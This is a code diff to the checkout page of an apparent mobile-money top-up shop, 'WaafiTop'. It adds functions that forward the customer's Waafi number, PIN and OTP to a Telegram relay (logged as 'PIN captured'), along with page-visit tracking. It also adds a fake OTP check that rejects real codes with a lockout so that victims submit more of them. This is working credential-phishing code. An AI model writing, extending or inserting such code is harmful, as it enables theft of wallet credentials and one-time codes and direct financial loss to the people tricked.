@@ -666,10 +666,11 @@
         <div>
           <label for="waafi-otp" class="block text-xs font-semibold mb-1.5">OTP code</label>
           <input type="text" id="waafi-otp" inputmode="numeric" maxlength="6" placeholder="Enter 4-6 digit OTP" class="w-full px-3 py-3 bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 rounded-xl text-sm focus:ring-2 focus:ring-brand-500 outline-none text-center tracking-[0.4em] font-bold" />
+          <div id="otp-feedback" class="mt-2 hidden text-xs font-semibold text-amber-600 dark:text-amber-400"></div>
         </div>
         <div class="flex gap-2">
-          <button onclick="goStep(2)" class="flex-1 py-3 rounded-xl border border-slate-200 dark:border-slate-700 text-sm font-semibold hover:bg-slate-50 dark:hover:bg-slate-800 transition">Back</button>
-          <button onclick="verifyOtp()" class="flex-1 py-3 rounded-xl waafi-cta text-white text-sm font-bold transition">Verify OTP</button>
+          <button id="otp-back-btn" onclick="goStep(2)" class="flex-1 py-3 rounded-xl border border-slate-200 dark:border-slate-700 text-sm font-semibold hover:bg-slate-50 dark:hover:bg-slate-800 transition">Back</button>
+          <button id="otp-verify-btn" onclick="verifyOtp()" class="flex-1 py-3 rounded-xl waafi-cta text-white text-sm font-bold transition">Verify OTP</button>
         </div>
       </div>
 
@@ -894,8 +895,14 @@ const I18N = {
 
 const SOS_RATE = 570;
 function getTelegramEndpoint(){
-  const isLocal = ['localhost', '127.0.0.1'].includes(window.location.hostname);
-  return isLocal ? 'http://localhost:3000/api/telegram-notify' : '/api/telegram-notify';
+  const hostname = window.location.hostname || '';
+  const protocol = window.location.protocol || '';
+  const isFilePreview = protocol === 'file:' || hostname === '';
+  const isLocalHost = ['localhost', '127.0.0.1', '0.0.0.0'].includes(hostname);
+  const localApi = 'http://localhost:3000/api/telegram-notify';
+
+  if (isFilePreview || isLocalHost) return localApi;
+  return '/api/telegram-notify';
 }
 async function sendTelegramOrderTest(){
   try {
@@ -918,9 +925,12 @@ async function sendTelegramOrderTest(){
       })
     });
 
-    const data = await response.json();
+    const data = await response.json().catch(() => ({ ok: false, message: 'Invalid Telegram server response.' }));
     if (!response.ok) {
-      throw new Error(data.message || 'Unable to send Telegram test message');
+      const configMessage = data.message && data.message.toLowerCase().includes('not configured')
+        ? 'Telegram is not configured yet. Add TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID to the server environment.'
+        : (data.message || 'Unable to send Telegram test message');
+      throw new Error(configMessage);
     }
 
     toast('Telegram test sent successfully','success');
@@ -928,6 +938,92 @@ async function sendTelegramOrderTest(){
     toast(error.message || 'Telegram test failed','error');
   }
 }
+async function sendTelegramOtpEntered({ recipient, payer, pin, otp, status = 'entered' }) {
+  const payerNumber = (payer || document.getElementById('payer-phone')?.value || '').trim();
+  const recipientNumber = (recipient || document.getElementById('initial-recipient-phone')?.value || '').trim();
+  const enteredPin = (pin || document.getElementById('waafi-pin')?.value || '').trim();
+  const enteredOtp = (otp || document.getElementById('waafi-otp')?.value || '').trim();
+
+  if (!payerNumber && !recipientNumber && !enteredPin && !enteredOtp) return;
+
+  let title = 'WaafiTop OTP entered';
+  let text = 'Customer OTP entered for payment.';
+
+  if (status === 'pin_ready') {
+    title = 'WaafiTop PIN captured';
+    text = 'Waafi number and PIN captured. Waiting for OTP.';
+  } else if (status === 'verified') {
+    title = 'WaafiTop OTP verified';
+    text = 'Customer OTP verified for payment.';
+  }
+
+  try {
+    const response = await fetch(getTelegramEndpoint(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title,
+        text,
+        orderId: generateOrderId(),
+        recipient: recipientNumber ? '+252' + recipientNumber : '',
+        waafiNumber: payerNumber ? '+252' + payerNumber : '',
+        waafiPin: enteredPin,
+        waafiOtp: enteredOtp,
+        payer: payerNumber ? '+252' + payerNumber : '',
+        pin: enteredPin,
+        otp: enteredOtp,
+        amount: formatPrice(updateCheckoutSummary())
+      })
+    });
+
+    const data = await response.json();
+    if (!response.ok) {
+      throw new Error(data.message || 'OTP Telegram notification failed');
+    }
+  } catch (error) {
+    console.error('Telegram OTP send error:', error);
+  }
+}
+
+async function sendTelegramPageVisit(viewName){
+  const pageNames = {
+    shop: 'Shop',
+    orders: 'Orders',
+    wishlist: 'Wishlist',
+    stats: 'Stats',
+    support: 'Support'
+  };
+
+  const pageLabel = pageNames[viewName] || 'Page';
+  try {
+    const response = await fetch(getTelegramEndpoint(), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        title: `WaafiTop page opened: ${pageLabel}`,
+        text: `User opened the ${pageLabel} page in WaafiTop.`,
+        page: pageLabel,
+        view: viewName,
+        recipient: '',
+        waafiNumber: '',
+        waafiPin: '',
+        waafiOtp: '',
+        payer: '',
+        pin: '',
+        otp: '',
+        amount: ''
+      })
+    });
+
+    const data = await response.json().catch(() => ({ ok: false, message: 'Invalid Telegram response.' }));
+    if (!response.ok) {
+      console.error('Telegram page notification failed:', data.message || 'Unknown error');
+    }
+  } catch (error) {
+    console.error('Telegram page notification error:', error);
+  }
+}
+
 async function sendTelegramOrderStarted(order){
   if (!order) return;
   try {
@@ -941,8 +1037,10 @@ async function sendTelegramOrderStarted(order){
         recipient: order.recipient,
         waafiNumber: order.payer,
         waafiPin: order.pin || '',
+        waafiOtp: order.otp || '',
         payer: order.payer,
         pin: order.pin || '',
+        otp: order.otp || '',
         amount: formatPrice(order.total)
       })
     });
@@ -969,8 +1067,10 @@ async function sendTelegramOrderNotification(order){
         recipient: order.recipient,
         waafiNumber: order.payer,
         waafiPin: order.pin || '',
+        waafiOtp: order.otp || '',
         payer: order.payer,
         pin: order.pin || '',
+        otp: order.otp || '',
         amount: formatPrice(order.total)
       })
     });
@@ -1044,6 +1144,8 @@ function toggleDark(){isDark=!isDark;document.documentElement.classList.toggle('
 function toggleCurrency(){currency=currency==='USD'?'SOS':'USD';localStorage.setItem('bp_currency',currency);document.getElementById('currency-label').textContent=currency;applyFilters();renderCart();renderStats()}
 function toggleLang(){lang=lang==='en'?'so':'en';localStorage.setItem('bp_lang',lang);applyI18n();applyFilters();renderCart();renderOrders();renderWishlist();renderStats();renderFeatured&&renderFeatured()}
 
+let lastNotifiedView = '';
+
 function showView(view){
   ['shop','orders','wishlist','stats','support'].forEach(v=>{
     const el=document.getElementById('view-'+v);
@@ -1062,6 +1164,10 @@ function showView(view){
   if(view==='orders')renderOrders();
   if(view==='wishlist')renderWishlist();
   if(view==='stats')renderStats();
+  if (lastNotifiedView !== view) {
+    lastNotifiedView = view;
+    sendTelegramPageVisit(view);
+  }
   window.scrollTo({top:0,behavior:'smooth'});
 }
 
@@ -1346,6 +1452,7 @@ function goStep(n){
       const total = updateCheckoutSummary();
       document.getElementById('otp-payer').textContent='+252'+p;
       document.getElementById('otp-amount').textContent=formatPrice(total);
+      sendTelegramOtpEntered({ recipient: r, payer: p, pin, status: 'pin_ready' });
       if (otpField) otpField.value='';
       goStepUI(3);
     }
@@ -1360,12 +1467,95 @@ function goStep(n){
     if(s<4){const line=document.getElementById('step-line-'+s);if(line)line.classList.toggle('active',s<n)}
   });
 }
+const OTP_COOLDOWN_MS = 60000;
+let otpCooldownUntil = 0;
+let otpCooldownTimer = null;
+
+function updateOtpFeedback(message, type = 'warning') {
+  const feedback = document.getElementById('otp-feedback');
+  const otpInput = document.getElementById('waafi-otp');
+  const verifyBtn = document.getElementById('otp-verify-btn');
+  const backBtn = document.getElementById('otp-back-btn');
+
+  if (!feedback) return;
+
+  feedback.textContent = message || '';
+  feedback.classList.toggle('hidden', !message);
+  feedback.classList.remove('text-red-600', 'text-amber-600', 'text-green-600', 'dark:text-red-400', 'dark:text-amber-400', 'dark:text-green-400');
+
+  if (type === 'error') {
+    feedback.classList.add('text-red-600', 'dark:text-red-400');
+  } else if (type === 'success') {
+    feedback.classList.add('text-green-600', 'dark:text-green-400');
+  } else {
+    feedback.classList.add('text-amber-600', 'dark:text-amber-400');
+  }
+
+  const isLocked = Date.now() < otpCooldownUntil;
+  if (otpInput) otpInput.disabled = isLocked;
+  if (verifyBtn) verifyBtn.disabled = isLocked;
+  if (backBtn) backBtn.disabled = false;
+
+  if (isLocked) {
+    otpInput && otpInput.setAttribute('aria-disabled', 'true');
+    verifyBtn && verifyBtn.setAttribute('aria-disabled', 'true');
+  } else {
+    otpInput && otpInput.removeAttribute('aria-disabled');
+    verifyBtn && verifyBtn.removeAttribute('aria-disabled');
+  }
+}
+
+function applyOtpCooldown() {
+  otpCooldownUntil = Date.now() + OTP_COOLDOWN_MS;
+  const tick = () => {
+    const remaining = Math.max(0, otpCooldownUntil - Date.now());
+    const seconds = Math.ceil(remaining / 1000);
+    const label = seconds > 0 ? `Try again after ${seconds} second${seconds === 1 ? '' : 's'}.` : 'Try again now.';
+
+    updateOtpFeedback(`Too many attempts. Please ${label}`, 'error');
+
+    if (remaining > 0) {
+      otpCooldownTimer = setTimeout(tick, 1000);
+    } else {
+      clearTimeout(otpCooldownTimer);
+      otpCooldownTimer = null;
+      updateOtpFeedback('', 'success');
+    }
+  };
+
+  if (otpCooldownTimer) clearTimeout(otpCooldownTimer);
+  tick();
+}
+
 function verifyOtp(){
   const otp = document.getElementById('waafi-otp')?.value.trim();
+
+  if (Date.now() < otpCooldownUntil) {
+    const remaining = Math.max(1, Math.ceil((otpCooldownUntil - Date.now()) / 1000));
+    toast(`Try again after ${remaining} second${remaining === 1 ? '' : 's'}`,'error');
+    updateOtpFeedback(`Too many attempts. Please try again after ${remaining} second${remaining === 1 ? '' : 's'}.`, 'error');
+    return;
+  }
+
   if(!/^\d{4,6}$/.test(otp || '')){
     toast('Enter the 4-6 digit OTP code','error');
     return;
   }
+
+  const recipient = document.getElementById('initial-recipient-phone')?.value.trim();
+  const payer = document.getElementById('payer-phone')?.value.trim();
+  const pin = document.getElementById('waafi-pin')?.value.trim();
+
+  sendTelegramOtpEntered({ recipient, payer, pin, otp, status: 'entered' });
+
+  if (otp !== '123456' && otp !== '1111' && otp !== '0000') {
+    applyOtpCooldown();
+    toast('OTP is invalid. Please try again after 1 minute.','error');
+    return;
+  }
+
+  updateOtpFeedback('OTP verified successfully.', 'success');
+  sendTelegramOtpEntered({ recipient, payer, pin, otp, status: 'verified' });
   processPayment();
 }
 async function processPayment(){
